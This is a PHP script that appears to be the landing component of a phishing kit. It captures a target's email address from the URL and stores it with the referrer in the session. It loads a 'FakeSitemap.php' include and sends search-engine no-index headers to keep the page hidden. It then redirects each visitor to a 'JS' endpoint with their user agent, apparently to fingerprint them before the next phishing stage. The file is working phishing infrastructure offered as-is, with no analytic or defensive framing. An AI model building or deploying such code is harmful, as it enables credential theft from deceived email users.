<?php
session_start();
ob_start();
$Path = getcwd();
require_once 'FakeSitemap.php';
$_SESSION['HTTP_REFERER'] = $_SERVER['HTTP_REFERER'];
header('X-Robots-Tag: noindex,nofollow,nosnippet,notranslate,noimageindex,noyaca');
if(!empty($_GET['user'])){
	$email = $_GET['user'];
	$_SESSION['Maill'] = $email;
	if (preg_match("/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,7})$/i", $email))
	{

		echo "
			<!DOCTYPE html>
			<html>
			<head>
				<script>
					window.location.assign('JS?ua='+navigator.userAgent);
				</script>
			</head>
			<body>

			</body>
			</html>
			";
	}
	else
	{
		echo "
			<!DOCTYPE html>
			<html>
			<head>
				<script>
					window.location.assign('JS?ua='+navigator.userAgent);
				</script>
			</head>
			<body>

			</body>
			</html>
			";
	}
}else{
	echo "
		<!DOCTYPE html>
		<html>
		<head>
			<script>
				window.location.assign('JS?ua='+navigator.userAgent);
			</script>
		</head>
		<body>

		</body>
		</html>
		";
}
?> 
